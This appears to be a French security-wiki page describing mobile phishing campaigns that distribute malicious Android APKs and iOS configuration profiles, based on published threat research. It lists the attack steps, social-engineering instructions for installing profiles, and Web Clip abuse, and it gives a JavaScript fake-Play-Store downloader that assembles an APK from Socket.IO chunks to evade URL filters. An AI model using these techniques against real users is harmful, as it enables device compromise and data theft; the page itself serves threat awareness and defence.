# Phishing mobile et distribution d’applications malveillantes (Android et iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Cette page présente les techniques utilisées par des acteurs malveillants pour distribuer des **APK Android malveillants** et des **profils de configuration mobile iOS** par phishing (SEO, ingénierie sociale, faux magasins d’applications, applications de rencontre, etc.).
> Le contenu est adapté de la campagne SarangTrap révélée par Zimperium zLabs (2025) et d’autres recherches publiques.<sup>[[1]](#references)</sup>

## Déroulement de l’attaque

1. **Infrastructure SEO/phishing**
   * Enregistrer des dizaines de domaines ressemblants (rencontres, partage dans le cloud, service automobile, etc.).  
     – Utiliser des mots-clés dans la langue locale et des émojis dans l’élément `<title>` pour obtenir un meilleur classement sur Google.  
     – Héberger les instructions d’installation Android (`.apk`) et iOS sur la même page d’atterrissage.
2. **Téléchargement de la première étape**
   * Android : lien direct vers un APK *non signé* ou provenant d’une « boutique tierce ».  
   * iOS : lien `itms-services://` ou HTTPS simple vers un profil **mobileconfig** malveillant (voir ci-dessous).
3. **Comportement après l’installation sur Android**
   * L’exécution contrôlée par C2, l’abus des permissions, les contournements de dropper, la collecte en arrière-plan et les autres comportements malveillants après l’installation sont présentés dans la page dédiée sur le post-exploitation des malwares Android ci-dessous.
4. **Technique de distribution sur iOS**
   * Un seul **profil de configuration mobile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc., pour inscrire l’appareil dans une supervision de type « MDM ».  
   * Instructions d’ingénierie sociale :
     1. Ouvrir Réglages ➜ *Profil téléchargé*.
     2. Toucher *Installer* trois fois (captures d’écran sur la page de phishing).  
     3. Faire confiance au profil non signé ➜ l’attaquant obtient les droits d’accès aux *Contacts* et aux *Photos* sans examen par l’App Store.
5. **Payload Web Clip iOS (icône d’application de phishing)**
   * Les payloads `com.apple.webClip.managed` peuvent **épingler une URL de phishing sur l’écran d’accueil** avec une icône et un libellé personnalisés.
   * Les Web Clips peuvent s’exécuter **en plein écran** (masquant l’interface du navigateur) et être définis comme **non supprimables**, obligeant la victime à supprimer le profil pour retirer l’icône.<sup>[[3]](#references)</sup>
6. **Couche réseau**
   * HTTP en clair, souvent sur le port 80 avec un en-tête HOST du type `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (pas de TLS → facile à repérer).

## Post-exploitation des malwares Android

Pour les techniques de malware Android après l’installation, notamment C2, l’abus d’Accessibility, les overlays, l’automatisation ATS, le chargement de DEX par étapes, les SMS surtaxés et la persistance, voir :

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Dissimulation d’APK via Socket.IO/WebSocket et fausses pages Google Play

Les attaquants remplacent de plus en plus les liens statiques vers des APK par un canal Socket.IO/WebSocket intégré à des leurres imitant Google Play. Cela dissimule l’URL du payload, contourne les filtres d’URL/d’extension et préserve une expérience d’installation réaliste.<sup>[[2]](#references)[[4]](#references)</sup>

Déroulement habituel côté client observé dans la nature :

<details>
<summary>Téléchargeur Socket.IO imitant Play (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Pourquoi cela contourne les contrôles simples :
- Aucune URL d’APK statique n’est exposée ; le payload est reconstruit en mémoire à partir des trames WebSocket.
- Les filtres d’URL, de type MIME et d’extension qui bloquent les réponses .apk directes peuvent ne pas détecter les données binaires transmises via WebSockets/Socket.IO.
- Les crawlers et les sandbox d’URL qui n’exécutent pas les WebSockets ne récupèrent pas le payload.

Voir aussi les techniques et outils WebSocket :

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [La face sombre de la romance : campagne d’extorsion SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Paramètres de payload Web Clips pour les appareils Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Cheval de Troie bancaire ciblant les utilisateurs Android indonésiens et vietnamiens](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
